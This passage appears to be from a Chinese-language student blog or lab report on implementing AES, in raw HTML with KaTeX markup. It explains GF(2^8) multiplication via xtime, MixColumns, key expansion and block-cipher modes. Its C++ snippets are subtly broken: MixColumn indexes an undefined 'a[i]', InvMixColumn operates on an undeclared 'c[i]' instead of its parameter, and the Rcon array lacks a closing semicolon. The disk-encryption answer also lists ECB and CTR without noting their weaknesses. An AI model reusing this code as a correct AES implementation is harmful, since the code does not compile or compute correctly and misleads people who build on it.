class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 也表示为有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上的向量与可逆矩阵乘法：</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/yg1slXq3QtjI8N9.png\" alt=\"\" /></p>\n<p>这里有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上的模乘运算如果再通过查表算，就需要 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>7</mn><mo>×</mo><mn>256</mn></mrow><annotation encoding=\"application/x-tex\">7\\times256</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">7</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">6</span></span></span></span> 大小的表，因为两个矩阵总共出现了 7 种不同的系数。在 AES 标准中没有使用查表，而是使用有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上位运算实现的乘 2 模运算  <code>xtime</code>  实现。这个函数运算非常简单，cpp 实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">auto</span> xtime = [](<span class=\"type\">uint8_t</span> x) -&gt; <span class=\"type\">uint8_t</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> (x &amp; <span class=\"number\">0x80</span>) ? ((x &lt;&lt; <span class=\"number\">1</span>) ^ <span class=\"number\">0x1B</span>) : (x &lt;&lt; <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>对于一般的有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>F</mi><mo stretchy=\"false\">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">GF(2^8)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">8</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 上模乘运算 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo>⊗</mo><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">a\\otimes b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span>，就能用  <code>xtime</code>  表示如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>⊗</mo><mi>b</mi><mo>=</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⋅</mo><msup><mtext>xtime</mtext><mn>7</mn></msup><mo stretchy=\"false\">(</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>+</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⋅</mo><msup><mtext>xtime</mtext><mn>6</mn></msup><mo stretchy=\"false\">(</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>+</mo><mo>⋯</mo><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⋅</mo><mtext>xtime</mtext><mo stretchy=\"false\">(</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⋅</mo><mi>a</mi><mtext>   </mtext><mo separator=\"true\">,</mo><mtext>   </mtext><msub><mi>b</mi><mi>i</mi></msub><mo>∈</mo><mo stretchy=\"false\">{</mo><mn>0</mn><mo separator=\"true\">,</mo><mn>1</mn><mo stretchy=\"false\">}</mo></mrow><annotation encoding=\"application/x-tex\">a\\otimes b=b_7\\cdot\\text{xtime}^{7}(a)+b_6\\cdot\\text{xtime}^{6}(a)+\\cdots+b_1\\cdot\\text{xtime}(a)+b_0\\cdot a\\ \\ \\ ,\\ \\ \\ b_i\\in\\{0,1\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">7</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.121868em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">xtime</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.871868em;\"><span style=\"top:-3.12076em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">7</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.121868em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord\">xtime</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.871868em;\"><span style=\"top:-3.12076em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">6</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord text\"><span class=\"mord\">xtime</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mpunct\">,</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">}</span></span></span></span></span></p>\n<p>然后矩阵运算还可以技巧性的使用中间变量，避免进行重复相同的运算，cpp 实现单独对一个列变换和反变换如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">MixColumn</span><span class=\"params\">(<span class=\"type\">uint8_t</span> * a)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> t, u;</span><br><span class=\"line\">    t = a[<span class=\"number\">0</span>] ^ a[<span class=\"number\">1</span>] ^ a[<span class=\"number\">2</span>] ^ a[<span class=\"number\">3</span>];</span><br><span class=\"line\">    u = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">    a[<span class=\"number\">0</span>] ^= t ^ <span class=\"built_in\">xtime</span>(a[i] ^ a[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    a[<span class=\"number\">1</span>] ^= t ^ <span class=\"built_in\">xtime</span>(a[<span class=\"number\">1</span>] ^ a[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    a[<span class=\"number\">2</span>] ^= t ^ <span class=\"built_in\">xtime</span>(a[<span class=\"number\">2</span>] ^ a[<span class=\"number\">3</span>]);</span><br><span class=\"line\">    a[<span class=\"number\">3</span>] ^= t ^ <span class=\"built_in\">xtime</span>(a[<span class=\"number\">3</span>] ^ u);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">InvMixColumn</span><span class=\"params\">(<span class=\"type\">uint8_t</span> * a)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> u, v;</span><br><span class=\"line\">    u = <span class=\"built_in\">xtime</span>(<span class=\"built_in\">xtime</span>(c[i] ^ c[i + <span class=\"number\">2</span>]));</span><br><span class=\"line\">    v = <span class=\"built_in\">xtime</span>(<span class=\"built_in\">xtime</span>(c[i + <span class=\"number\">1</span>] ^ c[i + <span class=\"number\">3</span>]));</span><br><span class=\"line\">    c[i] ^= u;</span><br><span class=\"line\">    c[i + <span class=\"number\">1</span>] ^= v;</span><br><span class=\"line\">    c[i + <span class=\"number\">2</span>] ^= u;</span><br><span class=\"line\">    c[i + <span class=\"number\">3</span>] ^= v;</span><br><span class=\"line\">    <span class=\"built_in\">MixColumn</span>(c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"key-expansion\"><a class=\"anchor\" href=\"#key-expansion\">#</a> Key Expansion</h2>\n<p>过程大致如图所示：</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/NglcXtvuFjoJQiM.png\" alt=\"\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3JjLm5pc3QuZ292L2ZpbGVzL3B1YnMvZmlwcy8xOTcvZmluYWwvZG9jcy9maXBzLTE5Ny5wZGY=\">NIST 的 AES 标准文档 FIPS 197 </span>给出的伪代码如下：</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/HlWeJjIm5DCrFwP.png\" alt=\"\" width=\"67%\" /></p>\n<p>这里关键的几个步骤在于如下 2 个函数：</p>\n<ul>\n<li>\n<p><code>SubWord</code> ，对一个 word 的 4 个字节分别进行和 SubBytes 变换一样的操作</p>\n</li>\n<li>\n<p><code>RotWord</code> ，对一个 word 的 4 个字节进行和 ShiftRows 变换第二行一样的操作</p>\n<p><img data-src=\"https://s2.loli.net/2024/11/21/ow4H3YKnRLfrveg.png\" alt=\"\" /></p>\n</li>\n</ul>\n<p>还有一个数组  <code>Rcon</code> ，定义为：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint8_t</span> Rcon[<span class=\"number\">32</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x40</span>,</span><br><span class=\"line\">    <span class=\"number\">0x80</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0x6C</span>, <span class=\"number\">0xD8</span>, <span class=\"number\">0xAB</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x9A</span>,</span><br><span class=\"line\">    <span class=\"number\">0x2F</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0xBC</span>, <span class=\"number\">0x63</span>, <span class=\"number\">0xC6</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0x35</span>, <span class=\"number\">0x6A</span>,</span><br><span class=\"line\">    <span class=\"number\">0xD4</span>, <span class=\"number\">0xB3</span>, <span class=\"number\">0x7D</span>, <span class=\"number\">0xFA</span>, <span class=\"number\">0xEF</span>, <span class=\"number\">0xC5</span>, <span class=\"number\">0x91</span>, <span class=\"number\">0x39</span>,</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在 AES-128 中只需要用到前 11 个。</p>\n<h1 id=\"思考题\"><a class=\"anchor\" href=\"#思考题\">#</a> 思考题</h1>\n<h2 id=\"问题-1\"><a class=\"anchor\" href=\"#问题-1\">#</a> 问题 1</h2>\n<p>除了课堂上介绍的五种模式以外，分组加密还有一些其他的工作模式。考虑下面的两个场景，使用什么工作模式可以满足它们的需求？这个工作模式的原理是什么？</p>\n<ul>\n<li>你需要检查密文是否被篡改（不需要单独使用 Hash 函数）。</li>\n<li>你需要加密一块磁盘。磁盘上的数据是以扇区（通常为 512 Bytes）为单位读写的，操作系统可以通过扇区号随机访问扇区。磁盘加密的密文长度必须要和明文相同，不能使用额外的空间。（有兴趣的话，可以尝试使用一下磁盘加密软件，例如开源的 VeraCrypt）</li>\n</ul>\n<h3 id=\"回答\"><a class=\"anchor\" href=\"#回答\">#</a> 回答</h3>\n<p>检查密文是否被篡改，就需要认证功能，分组密码中支持认证的模式被称为 AE 模式，例如：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPVhDQkMmYW1wO2FjdGlvbj1lZGl0JmFtcDtyZWRsaW5rPTE=\">XCBC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPUFDQkMmYW1wO2FjdGlvbj1lZGl0JmFtcDtyZWRsaW5rPTE=\">ACBC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvQXBtXyglRTklQTYlOTklRTYlQjglQUYp\">APM</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPU9DQiVFNSU4QSVBMCVFNSVBRiU4NiVFOCVBRSVBNCVFOCVBRiU4MSVFNiVBOCVBMSVFNSVCQyU4RiZhbXA7YWN0aW9uPWVkaXQmYW1wO3JlZGxpbms9MQ==\">OCB</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPUVBWCVFNSU4QSVBMCVFNSVBRiU4NiVFOCVBRSVBNCVFOCVBRiU4MSVFNiVBOCVBMSVFNSVCQyU4RiZhbXA7YWN0aW9uPWVkaXQmYW1wO3JlZGxpbms9MQ==\">EAX</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPUNXQyVFNSU4QSVBMCVFNSVBRiU4NiVFOCVBRSVBNCVFOCVBRiU4MSVFNiVBOCVBMSVFNSVCQyU4RiZhbXA7YWN0aW9uPWVkaXQmYW1wO3JlZGxpbms9MQ==\">CWC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPUNDTSVFNSU4QSVBMCVFNSVBRiU4NiVFOCVBRSVBNCVFOCVBRiU4MSVFNiVBOCVBMSVFNSVCQyU4RiZhbXA7YWN0aW9uPWVkaXQmYW1wO3JlZGxpbms9MQ==\">CCM</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3cvaW5kZXgucGhwP3RpdGxlPUdDTSVFNSU4QSVBMCVFNSVBRiU4NiVFOCVBRSVBNCVFOCVBRiU4MSVFNiVBOCVBMSVFNSVCQyU4RiZhbXA7YWN0aW9uPWVkaXQmYW1wO3JlZGxpbms9MQ==\">GCM</span>。</li>\n</ul>\n<p>有的模式也允许为未加密的关联数据进行认证，因此被称为 AEAD（Authenticated-Encryption with Associated-Data。</p>\n<p>对于磁盘加密，要求密文长度与明文相同且不能使用额外的空间，可以使用 ECB、CBC、CTR 、XTS（XEX Tweakable Block Cipher with ciphertext stealing）模式。根据我查阅到资料， XTS 模式是专门设计用于磁盘加密的工作模式，例如 Kingston 等厂商就会在其产品中使用。</p>\n<h2 id=\"问题-2\"><a class=\"anchor\" href=\"#问题-2\">#</a> 问题 2</h2>\n<p>尝试在实验 3-2 中实现全部五种工作模式：ECB、CBC、CFB、OFB、CTR。</p>\n<ul>\n<li>只要实现了对单个分组的加密和解密，实现其他的工作模式也是很简单的！</li>\n<li>选做，不会对分数产生影响。</li>\n</ul>\n<blockquote>\n<p>在前面有各个模式分析，当时我没时间搞这个</p>\n</blockquote>\n<h2 id=\"问题-3\"><a class=\"anchor\" href=\"#问题-3\">#</a> 问题 3</h2>\n<p>尝试使用 x64 CPU 的 AES 指令集（AES-NI）实现 AES-256。</p>\n<ul>\n<li>参考资料：x86/x64 SIMD 命令による AES 暗号処理</li>\n<li>理解 AES-NI 的各个指令的用途。</li>\n<li>上面的链接中有 C++ 编写的示例代码，仅供参考，不要直接提交或使用 GPT 格式化重命名后提交。</li>\n<li>请先用自己实现的版本 AC 后再编写使用 AES-NI 的版本，并在实验报告中附上两个版本的提交 ID。</li>\n<li>不计入思考题分数，但是可以影响性能分。</li>\n</ul>\n<blockquote>\n<p>见附录</p>\n</blockquote>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jc3JjLm5pc3QuZ292L2ZpbGVzL3B1YnMvZmlwcy8xOTcvZmluYWwvZG9jcy9maXBzLTE5Ny5wZGY=\">NIST 的 AES 标准文档 FIPS 197</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3A0LXRlYW0vY3J5cHRvLWNvbW1vbnMvYmxvYi9tYXN0ZXIvY3J5cHRvX2NvbW1vbnMvc3ltbWV0cmljYWwvYWVzLnB5\">一个叫 crypto_commons 的 python 库中 AES 的实现</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly95b3V0dS5iZS8zTVBrYy1QRlNSSQ==\">Youtube 上的一个 AES 图解系列视频</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9udmxwdWJzLm5pc3QuZ292L25pc3RwdWJzL0xlZ2FjeS9TUC9uaXN0c3BlY2lhbHB1YmxpY2F0aW9uODAwLTM4YS5wZGY=\">NIST 的文档 Recommendation for Block Cipher Modes of Operation</span></li>\n</ul>\n<h1 id=\"附录\"><a class=\"anchor\" href=\"#附录\">#</a> 